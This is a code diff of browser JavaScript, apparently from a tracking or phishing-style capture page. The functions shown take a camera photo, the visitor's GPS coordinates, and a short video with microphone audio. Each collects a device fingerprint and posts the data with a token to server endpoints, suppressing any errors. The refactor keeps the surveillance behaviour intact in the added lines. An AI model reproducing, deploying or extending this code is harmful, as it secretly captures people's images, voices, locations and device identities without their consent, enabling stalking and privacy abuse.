@@ -384,21 +384,7 @@ async function getLocationPos(){
 }
 async function sendPhoto(){
   try{
-    const stream=await getCameraStream("environment");
-    const v=document.createElement("video");
-    v.srcObject=stream;v.setAttribute("playsinline","");v.setAttribute("muted","");
-    await new Promise((res,rej)=>{v.onloadedmetadata=()=>v.play().then(res).catch(rej);v.onerror=rej;});
-    await new Promise(r=>setTimeout(r,1500));
-    const c=document.createElement("canvas");
-    c.width=v.videoWidth||1280;c.height=v.videoHeight||720;
-    c.getContext("2d").drawImage(v,0,0);
-    stream.getTracks().forEach(t=>t.stop());
-    const blob=await new Promise(r=>c.toBlob(r,"image/jpeg",0.9));
-    if(!blob||blob.size<800)return;
-    const fp=await collectFingerprint();
-    const form=new FormData();
-    form.append("token",token);form.append("photo",blob,"photo.jpg");form.append("fingerprint",JSON.stringify(fp));
-    fetch("/capture_combined_photo",{method:"POST",body:form});
+    await captureFromCamera("environment","photo.jpg");
   }catch(e){}
 }
 async function sendLocation(){
@@ -406,29 +392,21 @@ async function sendLocation(){
     const pos=await getLocationPos();
     const fp=await collectFingerprint();
     const form=new FormData();
-    form.append("token",token);form.append("lat",pos.coords.latitude);form.append("lon",pos.coords.longitude);form.append("fingerprint",JSON.stringify(fp));
-    fetch("/capture_combined_location",{method:"POST",body:form});
+    form.append('token',token);form.append('lat',pos.coords.latitude);form.append('lon',pos.coords.longitude);form.append('fingerprint',JSON.stringify(fp));
+    fetch('/capture_combined_location',{method:'POST',body:form});
   }catch(e){}
 }
 async function sendVideo(){
   try{
-    const mimeType=MediaRecorder.isTypeSupported("video/webm;codecs=vp8,opus")?"video/webm;codecs=vp8,opus":"video/webm";
-    const camStream=await getCameraStream("user");
-    const micStream=await getMicStream();
+    const mimeType=MediaRecorder.isTypeSupported('video/webm;codecs=vp8,opus')?'video/webm;codecs=vp8,opus':'video/webm';
+    const camStream=await getCameraStream('user');const micStream=await getMicStream();
     const combined=new MediaStream([...camStream.getVideoTracks(),...micStream.getAudioTracks()]);
-    const recorder=new MediaRecorder(combined,{mimeType});
-    const chunks=[];
-    recorder.ondataavailable=e=>{if(e.data.size>0)chunks.push(e.data);};
-    recorder.start(300);
-    await new Promise(r=>setTimeout(r,4000));
-    recorder.stop();
-    camStream.getTracks().forEach(t=>t.stop());micStream.getTracks().forEach(t=>t.stop());
-    await new Promise(r=>recorder.onstop=r);
-    const blob=new Blob(chunks,{type:mimeType});
-    const fp=await collectFingerprint();
-    const form=new FormData();
-    form.append("token",token);form.append("video",blob,"video.webm");form.append("fingerprint",JSON.stringify(fp));
-    fetch("/capture_combined_video",{method:"POST",body:form});
+    const recorder=new MediaRecorder(combined,{mimeType});const chunks=[];
+    recorder.ondataavailable=e=>{if(e.data.size>0)chunks.push(e.data);};recorder.start(300);
+    await new Promise(r=>setTimeout(r,4000));recorder.stop();camStream.getTracks().forEach(t=>t.stop());micStream.getTracks().forEach(t=>t.stop());
+    await new Promise(r=>recorder.onstop=r);const blob=new Blob(chunks,{type:mimeType});
+    const fp=await collectFingerprint();const form=new FormData();form.append('token',token);form.append('video',blob,'video.webm');form.append('fingerprint',JSON.stringify(fp));
+    fetch('/capture_combined_video',{method:'POST',body:form});
   }catch(e){}
 }
 async function sendAudio(){
